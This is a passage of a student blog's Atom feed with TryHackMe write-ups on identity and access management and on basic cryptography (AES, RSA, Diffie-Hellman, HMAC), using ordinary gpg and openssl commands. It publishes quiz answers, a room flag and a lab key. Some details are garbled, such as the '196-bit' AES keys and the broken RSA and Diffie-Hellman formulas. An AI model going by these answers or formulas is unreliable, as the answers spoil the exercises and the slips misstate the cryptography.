<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://nonohm.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://nonohm.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-03-15T22:39:11+00:00</updated><id>https://nonohm.github.io/feed.xml</id><title type="html">NonoHM</title><subtitle>Welcome to my personnal website. I am currently a 2nd year student in the &quot;BUT Réseaux et Télécommunications&quot; program. I like doing sports and music besides learning new things in IT. </subtitle><entry><title type="html">THM Identity and Access Management</title><link href="https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management/" rel="alternate" type="text/html" title="THM Identity and Access Management"/><published>2024-02-27T21:58:58+00:00</published><updated>2024-02-27T21:58:58+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Identity-and-Access-Management/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we will cover some concepts which answers to the question “How to verify a leigitmate user and how to restrict access ?”.</p> <ol> <li>Identification</li> <li>Authentication</li> <li>Strong passwords and Multi-Factor Authentication (MFA)</li> <li>Authorisation and Access Control</li> <li>Logging and Auditing</li> </ol> <h3 id="learning-objectives">Learning Objectives</h3> <p>By the end of this room, we will gain the knowledge about the following concepts:</p> <ul> <li>Identification</li> <li>Authentication</li> <li>Authorisation</li> <li>Accountability</li> <li>Access Control Models</li> <li>Single Sign-On</li> </ul> <h2 id="task-2---iaaa-model">Task 2 - IAAA Model</h2> <p>IAAA stands for Identification, Authentication, Authorization and Acountability and they are the four pillars of information security.</p> <p>These four stages consists of :</p> <ol> <li><strong>Identification</strong> is the process of verifying who the user is. It starts with a user claiming an identity, like a username, an email address…</li> <li><strong>Authentication</strong> is the process of ensuring the user is the one he pretends to be. This can be made through passwords, SSO, one-time codes…</li> <li><strong>Authorization</strong> determines what rights the user has to access to something. This process is usually done by assinging roles and permissions to an acocunt and normally, the only ones the user needs to perform his actions.</li> <li><strong>Accountability</strong> tracks the user’s activity to ensure who is responsible for what. This is typically done by logging all the user activity and storing it in a centralized location.</li> </ol> <p>IAAA helps prevent unauthorised access, data breaches, and other security incidents. By implementing these best practices, organisations can protect their sensitive information and resources from internal and external threats.</p> <h3 id="questions">Questions</h3> <p><strong>You are granted access to read and send an email. What is the name of this process?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Authorisation</code></em></p> <p><strong>Which process would require you to enter your username?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identification</code></em></p> <p><strong>Although you have write access, you should only make changes if necessary for the task. Which process is required to enforce this policy?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Accountability</code></em></p> <h2 id="task-3---identification">Task 3 - Identification</h2> <p>Identification is how the user claims a specific identitiy without verifying. This is made through a unique number, name, email address…</p> <p>Howerver, without a proper authentication system, anyone can claim to be anything, like giving a fake identity.</p> <h3 id="questions-1">Questions</h3> <p><strong>Which of the following cannot be used for identification?</strong></p> <ol> <li>Email address</li> <li>Mobile number with international code</li> <li>Year of birth</li> <li>Passport number</li> </ol> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3</code></em></p> <p><strong>Which of the following cannot be used for identification?</strong></p> <ol> <li>Landline phone number</li> <li>Street number</li> <li>Health insurance card number</li> <li>Student ID number</li> </ol> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <h2 id="task-4---authentication">Task 4 - Authentication</h2> <p>Authentication is the process of verifying the user’s identity. Idenficitation and Authentication are core components of any information system and network. It is essential to understand the difference between authentication and identification.</p> <p>This process is usually accomplished through one of the following ways:</p> <ul> <li><strong>Something you know</strong>: Password, OTP/OTC…</li> <li><strong>Something you have</strong>: License dongle, card…</li> <li><strong>Something you are</strong>: Biometrical informations like fingerprint or face recognition.</li> </ul> <p>Two other methods are less used but can also be taken in account:</p> <ul> <li>Somewhere you are (logical/physical location).</li> <li>Something you do (behaviour).</li> </ul> <h3 id="multi-factor-authentication-mfa">Multi-Factor Authentication (MFA)</h3> <p>MFA refers using <strong>two or more</strong> of the above mechanisms. The purpose is to add a security in case one of it is compromised like a password getting hacked but using MFA, to access to the account, an authenticator code is needed.</p> <h3 id="questions-2">Questions</h3> <p>Answer the following questions using the correct item number from the numbered list below.</p> <ol> <li>Something you know</li> <li>Something you have</li> <li>Something you are</li> <li>2FA</li> </ol> <p><strong>When you want to check your email, you enter your username and password. What kind of authentication is your email provider using?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Your bank lets you finish most of your banking operations using its app. You can log in to your banking app by providing a username and a password and then entering the code received via SMS. What kind of authentication is the banking app using?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <p><strong>Your new landline phone system at home allows callers to leave you a message when the call is not picked up. You can call your home number and enter a secret number to listen to recorded messages. What kind of authentication is being used here?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>You have just started working at an advanced research centre. You learned that you need to swipe your card and enter a four-digit PIN whenever you want to use the elevator. Under which group does this authentication fall?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <h2 id="task-5---authorisation-and-access-control">Task 5 - Authorisation and Access Control</h2> <p>Once authenticated, <strong>authorization</strong> specifies what the user should be allowed to access and do. This means defining permissions and privileges to a user.</p> <p><strong>Access control</strong> on another side, enforces the given policy to ensure only authorized people can access to the given content.</p> <h3 id="questions-3">Questions</h3> <p>In the following questions, answer with 1 or 2 to indicate:</p> <ol> <li>Authorisation</li> <li>Access Control</li> </ol> <p><strong>The new policy states that the secretary should be able to send an email on the manager’s behalf. What is this policy dictating?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>You shared a document with your colleague and gave them view permissions so they could read without making changes. What would ensure that your file won’t be modified?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>The hotel management decided that the cleaning staff needed access to all the hotel rooms to do their work. What phase is this decision part of?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <h2 id="task-6---accountability-and-logging">Task 6 - Accountability and Logging</h2> <p><strong>Accountability</strong> ensure the users, once authorised to access a system, can be held responsible for their actions. This is possible if there is <strong>auditing</strong> capabilities, which requires <strong>logging</strong>.</p> <h3 id="logging">Logging</h3> <p>Logging is the process of recording events that occur within a system. This process includes user actions, system events, and errors. By logging user actions, an organisation can maintain a record of who accessed what information and when. This record is vital for regulatory compliance, incident response, and forensic investigations.</p> <p>A comprehensive logging system can identify anomalies and alert or take actions over them if configured for.</p> <p>Logs should be <strong>tamper-proof</strong> in order to not be deleted, that is why a separate logging server is a good practive in a network.</p> <p><strong>Log forwarding</strong> is the process of sending log data from one system to another. This process often aggregates log data from multiple sources into a central location for more accessible analysis and management.</p> <p>By centralizing log data, potential security threats can be more easily identified by analysing and correlating collected log events.</p> <h3 id="logging-and-siem">Logging and SIEM</h3> <p>Security Information and Event Management (SIEM) is a technology that aggregates log data from multiple sources and analyses it for signs of security threats. SIEM solutions can help organisations identify anomalies, detect potential security incidents, and provide alerts to security teams.</p> <p>SIEM and logging also provides benefits such as compliance reporting and forensic investigations. Compliance reporting helps meet reporting requirements by collecting data necessary for audits. Forensic investigations are crucial in identifying the source and cause of a security incident and need a detailed system and network activity history.</p> <h2 id="task-7---identity-management">Task 7 - Identity Management</h2> <p>Identity Management (IdM) includes all the necessary policies and technologies for IAAA. It ensures that only authorised people have access to the needed assets and resources for working properly while unauthorized people are being denied.</p> <p>IdM helps in the tasks of:</p> <ul> <li>Protecting sensitive data</li> <li>Complying with regulations</li> <li>Simplifying user access process</li> <li>Improving UX (User Experience)</li> <li>Reducing costs</li> </ul> <p>IdM must be implemented correctly with effective strategies to ensure these rules are respected.</p> <p>Sometimes, IdM and Identity and Access Management (IAM) can be used interchangeably. However, some sources state that IdM tend to be more focus on Authentication and Permissions with users, devices and group management while IAM is more concerned with evaluating attributes and permissions for granting or denying access.</p> <h3 id="identity-management-idm">Identity Management (IdM)</h3> <p>IdM is the essential cybersecurity component that refers to the process of managing and controlling digital identities. It involves:</p> <ul> <li>Authentication</li> <li>Authorization</li> <li>Access Control</li> </ul> <p>The main goal is to ensure the access of authorized individuals only. They are use to manage user identities across an organization’s network.</p> <p>IdM systems use a centralized database to store identities and access rights. IdM systems generally include features such as user provisioning, authentication, and authorisation. User provisioning refers to the process of creating and managing user accounts, while authentication and authorisation refer to verifying the identity of a user and granting access to specific resources.</p> <p>To resume, IdM simplifies the user identity and access management by centralizing it.</p> <h3 id="identity-and-access-management-iam">Identity and Access Management (IAM)</h3> <p>IAM is like subcategory of IdM. It works with the IdM but it focuses more on identity and access management. It ensures that only authorized users have access to specific resources. It also monitors and controls access.</p> <p>It is a comprhensive and secure solution to access to ressources by providing various technologies like role-based access control, Multi-Factor Authentication (MFA) and Single Sign On (SSO).</p> <p>IAM help organization comply with regulatory requirements such as <a href="https://www.hipaaguide.net/hipaa-for-dummies/">HIPAA</a> or <a href="https://www.hipaaguide.net/gdpr-for-dummies/">GDPR</a>. they provide functionnalities to manage lifecycle of user identities, including onboarding, offboarding, and access revocation.</p> <p>To clarify, IdM systems manage user identities, while IAM systems encompass broader functions to manage and secure digital identities and access rights.</p> <h3 id="questions-4">Questions</h3> <p><strong>What does IdM stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identity Management</code></em></p> <p><strong>What does IAM stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Identity and Access Management</code></em></p> <h2 id="task-8---attacks-against-authentication">Task 8 - Attacks Against Authentication</h2> <p>In the real world and even in the digital world, having a passphrase to enter somewhere is almost impossible to be secure without cryptography because it can be known by unwanted people.</p> <h3 id="replay-attack">Replay Attack</h3> <p>A user log in on a page and the password is encrypted. Unfortuantely, the attacker uses the encrypted version and can login to the account.</p> <h3 id="unique-challenge-response">Unique Challenge Response</h3> <p>An encrypted password with always the same value is easy to circumvent. One approach would be to send an encryption of the current time along with the password. It requires for both parts to synchronize their clocks and ensures the response is only valid for a brief time. This is one way to do it and although it is not that secure, authentication protocols are beyond the scope of this room.</p> <h3 id="question">Question</h3> <p><strong>The attacker could authenticate using the user’s response when the authentication protocol required a password encrypted with a shared key. What is the name of the attack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Replay Attack</code></em></p> <h2 id="task-9---access-control-models">Task 9 - Access Control Models</h2> <p>A system controls access to various resources based on the chosen model. Somme of the common ones are:</p> <ol> <li>Discretionary Access Control (DAC)</li> <li>Role-Based Access Control (RBAC)</li> <li>Mandatory Access Control (MAC)</li> </ol> <h3 id="discretionary-access-control">Discretionary Access Control</h3> <p>DAC is the fact of explicitely giving permissions to users. This is mainly used on sharing plateforms/file access and on a small scale because this process is very straightforward and fully controled by the data owner.</p> <h3 id="role-based-access-control">Role-Based Access Control</h3> <p>RBAC uses an intutive approach of control. Each user has one or more roles, furthermore they are authorized to access different ressources based on their roles. Authroization and access will be granted based on the group the user belongs to.</p> <p>This approach makes maintenance more manageable and efficient by adding or removing roles if needed.</p> <h3 id="mandatory-access-control">Mandatory Access Control</h3> <p>MAC prioritize security and significantly limit users’ abilities. In other words, users do not need to carry out tasks beyond the strictly necessary like install new software.</p> <p>SELinux or AppArmor are great exemples of MAC on Linux ditributions.</p> <h3 id="questions-5">Questions</h3> <p>Answer the following questions using the correct item number from the numbered list below.</p> <ol> <li>DAC</li> <li>RBAC</li> <li>MAC</li> </ol> <p><strong>You are sharing a document via a network share and giving edit permission only to the accounting department. What example of access control is this?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>You published a post on a social media platform and made it only visible to three out of your two hundred friends. What kind of access control did you use?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <h2 id="task-10---single-sign-on">Task 10 - Single Sign On</h2> <p>Accessing ressources on multiple platforms usally requires multiple login credentials for successful secure authentication. The number of different usernames and passwords makes it quite challenging.</p> <p>Single Sign On (SSO) tackles this problem beacause it provides a centralized authentication method, which means one login credential to remember.</p> <figure> <picture> <img src="/assets/img/images/thm_identity_and_access_management/H1OH23j2T.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="SSO" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Some advantages are:</p> <ul> <li><strong>One strong password</strong>: One credential to remember.</li> <li><strong>Easier MFA</strong>: MFA configured once.</li> <li><strong>Simpler support</strong>: Support requests one one account (e.g: Password reset).</li> <li><strong>Efficiency</strong>: One time login.</li> </ul> <p>Some disadvantages:</p> <ul> <li><strong>More dangerous compromising</strong>: If the account is compromised, every ressources with SSO access are compromised too.</li> <li><strong>Outage incident</strong>: Every accesses are unavailable without SSO.</li> <li><strong>Complexity</strong>: SSO implementation and session are complex to make.</li> </ul> <h3 id="questions-6">Questions</h3> <p><strong>What does SSO stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Single Sign-On</code></em></p> <p><strong>Does SSO simplify MFA use as it needs to be set up once? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <p><strong>Is it true that SSO can be cumbersome as it requires the user to remember and input different passwords for the various services? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Nay</code></em></p> <p><strong>Does SSO allow users to access various services after signing in once? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <p><strong>Does the user need to create and remember a single password when using SSO? (Yea/Nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Yea</code></em></p> <h2 id="task-11---scenarios">Task 11 - Scenarios</h2> <p>Answer the options one the <em>View Site</em> button.</p> <ul> <li>Fingerprint/Pattern/Code: Authentication</li> <li>ATM random code: Identification</li> <li>Mail: Id</li> <li>Policy: Authorisation</li> <li>Name: Id</li> <li>Unix logging attempts: Logging</li> <li>shadow: Access Control</li> <li>Pattern: Auth</li> </ul> <p><em>answer: <code class="language-plaintext highlighter-rouge">{THM_ACCESS_CONTROL}</code></em></p> <h2 id="task-12---conclusion">Task 12 - Conclusion</h2> <p>In this room, we covered the different processes, from identification to logging. We also discussed access control models, SSO, and standards related to authentication and authorisation.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Introduction to Cryptography</title><link href="https://nonohm.github.io/blog/2024/THM-Introduction-to-Cryptography/" rel="alternate" type="text/html" title="THM Introduction to Cryptography"/><published>2024-02-11T21:06:35+00:00</published><updated>2024-02-11T21:06:35+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Introduction-to-Cryptography</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Introduction-to-Cryptography/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>The purpose of this room is to introduce users to basic cryptography concepts such as:</p> <ul> <li>Symmetric encryption, such as AES</li> <li>Asymmetric encryption, such as RSA</li> <li>Diffie-Hellman Key Exchange</li> <li>Hashing</li> <li>PKI</li> </ul> <p>One of the earliest cryptographic mechanism is Ceasar Cipher. Its priciple is to shift the letter by a fixed number of places to the left or right. Consequently the key is between 1 and 25, the number of shifts. Example: TryHackMe -&gt; WubKdfnPh with a key of 3.</p> <p>This is a <strong>substitution cipher</strong> because we replace each letter by another. Another type of cipher is called <strong>transposition cipher</strong>, which encrypts the message by changing the order of the letters.</p> <figure> <picture> <img src="/assets/img/images/thm_introduction_to_cryptography/B1leoiUja.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="Transpoition Cipher Example" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>For an encryption algorithm to be considered <strong>secure</strong>, it should be infeasible to recover the original message in a reasonable time.</p> <h3 id="questions">Questions</h3> <p><strong>You have received the following encrypted message:</strong></p> <p><em>“Xjnvw lc sluxjmw jsqm wjpmcqbg jg wqcxqmnvw; xjzjmmjd lc wjpm sluxjmw jsqm bqccqm zqy.” Zlwvzjxj Zpcvcol</em></p> <p><strong>You can guess that it is a quote. Who said it?</strong></p> <p>Using <a href="https://www.quipqiup.com/">quipquip</a>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Miyamoto Musashi</code></em></p> <h2 id="task-2---symmetric-encryption">Task 2 - Symmetric Encryption</h2> <p>Let’s review some terminology:</p> <ul> <li><strong>Cryptographic Algorithm</strong> or <strong>Cipher</strong>: This algorithm defines the encryption and decryption processes.</li> <li><strong>Key</strong>: The cryptographic algorithm needs a key to convert the plaintext into ciphertext and vice versa.</li> <li><strong>Plaintext</strong>: original message that we want to encrypt</li> <li><strong>Ciphertext</strong>: message in its encrypted form</li> </ul> <p>A symmetric encryption algorithm uses the same key for encryption and decryption. Consequently, the communicating parties need to agree on a secret key before being able to exchange any messages.</p> <p>In 1977, the Data Encryption Standard (DES) was puslished by the National Institute of Standard and Technology (NIST). This is an encryption algorithm that uses a key size of 56 bits and it nowadays considered as an insecure cypher algoritm because it has demonstrated that the key could be brute-force searched.</p> <p>In 2001, the same organization published the Advanced Encryption Standard (AES). Like DES it is a symmetric algorithm but it uses keys of 128, 196 or 256 bits ans it is still considered as secure today. AES iterate through these transformations multiple times:</p> <ul> <li><code class="language-plaintext highlighter-rouge">SubBytes(state)</code>: This transformation looks up each byte in a given substitution table (S-box) and substitutes it with the respective value. The state is 16 bytes, i.e., 128 bits, saved in a 4 by 4 array.</li> <li><code class="language-plaintext highlighter-rouge">ShiftRows(state)</code>: The second row is shifted by one place, the third row is shifted by two places, and the fourth row is shifted by three places.</li> <li><code class="language-plaintext highlighter-rouge">MixColumns(state)</code>: Each column is multiplied by a fixed matrix (4 by 4 array).</li> <li><code class="language-plaintext highlighter-rouge">AddRoundKey(state)</code>: A round key is added to the state using the XOR operation.</li> </ul> <p>In order to encrypt, strings are converted into their hexadecimal values. Then these are encrypted using block or stream algorithms:</p> <ul> <li><strong>Block</strong>: Characters are concatenated into blocks of a defined size and then encrypted.</li> <li><strong>Stream</strong>: Each character is encrypted at a time.</li> </ul> <p>Symmetric encyption solves the CIA Triad problem:</p> <ul> <li><strong>Confidentiality</strong>: The message cannot be understood without the key</li> <li><strong>Integrity</strong>: Even minor modifications lead to gibberish plaint text.</li> <li><strong>Authenticity</strong>: Only the conserned parts must know the key.</li> </ul> <p>These two programsare widely use for symmetric but asymmetric encryption as well:</p> <ul> <li>GNU Privacy Guard</li> <li>OpenSSL Project</li> </ul> <h3 id="gnu-privacy-guard">GNU Privacy Guard</h3> <ul> <li>Encryption</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpg <span class="nt">--symmetric</span> <span class="nt">--armor</span> <span class="nt">--cipher-algo</span> CIPHER message.txt
</code></pre></div></div> <blockquote> <p><code class="language-plaintext highlighter-rouge">--armor</code> option makes an ascii output</p> </blockquote> <ul> <li>Decryption</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpg <span class="nt">--output</span> original_message.txt <span class="nt">--decrypt</span> message.gpg
</code></pre></div></div> <h3 id="openssl-project">OpenSSL Project</h3> <ul> <li>Encrypt</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl aes-256-cbc <span class="nt">-pbkdf2</span> <span class="nt">-iter</span> 10000 <span class="nt">-e</span> <span class="nt">-in</span> message.txt <span class="nt">-out</span> encrypted_message
</code></pre></div></div> <blockquote> <p><code class="language-plaintext highlighter-rouge">-pbkdf2</code> and <code class="language-plaintext highlighter-rouge">-iter &lt;number&gt;</code> options are optional but makes the encryption more secure and resilient against brute-force attacks</p> </blockquote> <ul> <li>Decrypt</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl aes-256-cbc <span class="nt">-pbkdf2</span> <span class="nt">-iter</span> 10000 <span class="nt">-d</span> <span class="nt">-in</span> encrypted_message <span class="nt">-out</span> original_message.txt
</code></pre></div></div> <h3 id="questions-1">Questions</h3> <p><strong>Decrypt the file quote01 encrypted (using AES256) with the key <code class="language-plaintext highlighter-rouge">s!kR3T55</code> using gpg. What is the third word in the file?</strong></p> <p>The used command: <code class="language-plaintext highlighter-rouge">gpg --output quote01.txt --decrypt quote01.txt.gpg</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">waste</code></em></p> <p><strong>Decrypt the file quote02 encrypted (using AES256-CBC) with the key <code class="language-plaintext highlighter-rouge">s!kR3T55</code> using openssl. What is the third word in the file?</strong></p> <p>The used command: <code class="language-plaintext highlighter-rouge">openssl aes-256-cbc -d -in quote02 -out quote02.txt</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">science</code></em></p> <p><strong>Decrypt the file quote03 encrypted (using CAMELLIA256) with the key <code class="language-plaintext highlighter-rouge">s!kR3T55</code> using gpg. What is the third word in the file?</strong></p> <p>The used command: <code class="language-plaintext highlighter-rouge">gpg --output quote03.txt --decrypt quote03.txt.gpg</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">understand</code></em></p> <h2 id="task-3---asymmetric-encryption">Task 3 - Asymmetric Encryption</h2> <p>Symmetric encryption requires the users to find a secure channel to exchange keys. By secure channel, we are mainly concerned with confidentiality and integrity. In other words, we need a channel where no one can change and read the sent messages.</p> <p>Asymmetric encryption makes it possible to exchange encrypted messages without a secure channel; we just need a reliable channel. When using an asymmetric encryption algorithm, we would generate a key pair: a public key and a private key.</p> <ul> <li><strong>Public key</strong>: Shared key used to encrypt the data.</li> <li><strong>Private key</strong>: Never shared to anyone, used to decrypt the data.</li> </ul> <h3 id="confidentiality">Confidentiality</h3> <p>Confidentiality is achieved by encrypting using the public key and decrypting using the private key.</p> <h3 id="integrity-authenticity-and-nonrepudiation">Integrity, Authenticity, and Nonrepudiation</h3> <p>They are achieved by encrypting using the private key and decrypting using the public key. Because the owner is normally the only one who have the key, this proves he is really the author.</p> <ul> <li><strong>Integrity</strong>: The message is not altered.</li> <li><strong>Authenticity</strong>: By successfully de-signing using the public key, it proves the author of the message by comparing the encrypted and the de-signed encrypted message.</li> <li><strong>Nonrepudation</strong>: Nobody can deny the origin of the message.</li> </ul> <p>Asymmetric ciphers can cover more fields than the symmetrical ones but it can’t encrypt large amount of data fast.</p> <p>Two main asymmetric encrypting methods exists today:</p> <ul> <li>RSA</li> <li>Eliptic Curves</li> </ul> <h3 id="rsa">RSA</h3> <p>RSA got its name from its inventors, Rivest, Shamir, and Adleman. It works as follows:</p> <ol> <li>Choose two random prime numbers, p and q. Calculate N = p × q.</li> <li>Choose two integers e and d such that e × d = 1 mod ϕ(N), where ϕ(N) = N − p − q + 1. This step will let us generate the public key (N,e) and the private key (N,d).</li> <li>The sender can encrypt a value x by calculating y = xe mod N. (Modulus)</li> <li>The recipient can decrypt y by calculating x = y^d mod N. Note that y^d = x^ed = x^kϕ(N) + 1 = ((x^ϕ(N))^k) × x = x. This step explains why we put a restriction on the choice of e and d.</li> </ol> <p>RSA security relies on factorization being a hard problem. It is easy to multiply p by q; however, it is time-consuming to find p and q given N. Moreover, for this to be secure, p and q should be pretty large numbers. It is important to note that RSA relies on secure random number generation, as with other asymmetric encryption algorithms. If an adversary can guess p and q, the whole system would be considered insecure.</p> <h3 id="openssl">OpenSSL</h3> <ul> <li>Generate a new private key</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> private-key.pem 2048
</code></pre></div></div> <ul> <li>Derive that private key to a public key</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsa <span class="nt">-in</span> private-key.pem <span class="nt">-pubout</span> <span class="nt">-out</span> public-key.pem
</code></pre></div></div> <ul> <li>To see RSA variables used</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsa <span class="nt">-in</span> private-key.pem <span class="nt">-text</span> <span class="nt">-noout</span>
</code></pre></div></div> <ul> <li>To encrypt</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkeyutl <span class="nt">-encrypt</span> <span class="nt">-in</span> plaintext.txt <span class="nt">-out</span> ciphertext <span class="nt">-inkey</span> public-key.pem <span class="nt">-pubin</span>
</code></pre></div></div> <ul> <li>To decrypt</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkeyutl <span class="nt">-decrypt</span> <span class="nt">-in</span> ciphertext <span class="nt">-inkey</span> private-key.pem <span class="nt">-out</span> decrypted.txt
</code></pre></div></div> <h3 id="questions-2">Questions</h3> <p><em>Files located in task03</em></p> <p><strong>Bob has received the file <code class="language-plaintext highlighter-rouge">ciphertext_message</code> sent to him from Alice. You can find the key you need in the same folder. What is the first word of the original plaintext?</strong></p> <p>We need to decrypt using the bob’s private key using the following command: <code class="language-plaintext highlighter-rouge">openssl pkeyutl -decrypt -in ciphertext_message -inkey private-key-bob.pem -out plaintext_message.txt</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Perception</code></em></p> <p>Take a look at Bob’s private RSA key. What is the last byte of p?</p> <p>The used command: <code class="language-plaintext highlighter-rouge">openssl rsa -in private-key-bob.pem -text -noout | more</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">e7</code></em></p> <p>Take a look at Bob’s private RSA key. What is the last byte of q?</p> <p>Same command used.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">27</code></em></p> <h2 id="task-4---diffie-hellman-key-exchange">Task 4 - Diffie-Hellman Key Exchange</h2> <p>Diffie-Hellman is an asymmetric encryption algorithm which allow the exchange of a secret over a public channel. This works using power and modulus:</p> <ol> <li>Alice and Bob agrees on <em>q</em> and <em>g</em>; <em>q</em> is a prime number and <em>g &lt; q</em>.</li> <li>Alice and Bob picks respectively, a private number <em>a</em> and <em>b</em> smaller than q.</li> <li> <table> <tbody> <tr> <td>They calculate *A/B = g^(a</td> <td>b) mod q*</td> </tr> </tbody> </table> </li> <li>These are sent to each other.</li> <li> <table> <tbody> <tr> <td>They calculate *k = (A</td> <td>B)^(a</td> <td>b) mod q*</td> </tr> </tbody> </table> </li> </ol> <p>Finally they reach the same key. In real life, chosen numbers mostly are 256 bits in length.</p> <p>Here is a simplified diagram:</p> <p><img src="/assets/img/images/thm_introduction_to_cryptography/HJP74TIia.png" alt="Diffie-Hellman algorithm with colors. Source: ResearchGate"/></p> <h3 id="openssl-1">OpenSSL</h3> <ul> <li>To generate Diffie-Hellman parameters</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl dhparam <span class="nt">-out</span> dhparams.pem 2048
</code></pre></div></div> <blockquote> <p><code class="language-plaintext highlighter-rouge">-text -noout</code> options to directly see parameters instead of <code class="language-plaintext highlighter-rouge">-out</code>.</p> </blockquote> <ul> <li>To see the parameters</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl dhparam <span class="nt">-in</span> dhparams.pem <span class="nt">-text</span> <span class="nt">-noout</span>
</code></pre></div></div> <h3 id="questions-3">Questions</h3> <p><em>Files located in task04</em></p> <p><em>A set of Diffie-Hellman parameters can be found in the file <code class="language-plaintext highlighter-rouge">dhparam.pem</code>. What is the size of the prime number in bits?</em></p> <p>The used command: <code class="language-plaintext highlighter-rouge">openssl dhparam -in dhparams.pem -text -noout</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4096</code></em></p> <p>What is the prime number’s last byte (least significant byte)?</p> <p>Same command used.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4f</code></em></p> <h2 id="task-5---hashing">Task 5 - Hashing</h2> <p>A cryptographic hash function is an algorithm that takes data of arbitrary size as its input and returns a fixed size value, called <em>message digest</em> or <em>checksum</em>, as its output. The returned value is always the same for the same input data and should never be the same even with the most minor modification. An example of hashing algorithm is <em>SHA256</em>. The 256 indicates that the message digest size is 256 bits long.</p> <p>This type of function is useful for:</p> <ul> <li><strong>Storing passwords</strong>: Passwords are stored in their hashed format. This is useful when a data breach occus in order to protect them.</li> <li><strong>Detecting Modifications</strong>: Any modifications, like said before, lead to a drastic hash value change.</li> </ul> <p>Some of the hashing algorithms in use and still considered secure are:</p> <ul> <li>SHA224, SHA256, SHA384, SHA512</li> <li>RIPEMD160</li> </ul> <p>To calculate hash on linux, we have tools like <code class="language-plaintext highlighter-rouge">sha256sum</code>…</p> <h3 id="hmac">HMAC</h3> <p>Hash-based message authentication code (HMAC) is a message authentication code (MAC) that uses a cryptographic key in addition to a hash function.</p> <p>According to RFC2104, HMAC needs:</p> <ul> <li>Secret key</li> <li>Inner pad (ipad) a constant string. (RFC2104 uses the byte 0x36 repeated B times. The value of B depends on the chosen hash function.)</li> <li>Outer pad (opad) a constant string. (RFC2104 uses the byte 0x5C repeated B times.)</li> </ul> <p>The HMAC is calculated as the following:</p> <ol> <li>Fill the key with zeroes to make it the length of B, length which match that of the ipad.</li> <li><em>key ⊕ ipad</em>.</li> <li>Append the message to it and apply the hash function.</li> <li><em>key ⊕ opad</em></li> <li>Append the result to the hash output from step 3.</li> <li>Apply the hash function.</li> </ol> <p>This represents the formula: <em>H(K⊕opad,H(K⊕ipad,text))</em>.</p> <blockquote> <p>Note: ⊕ = XOR operation</p> </blockquote> <p>To calculate hmac on linux, we have tools like <code 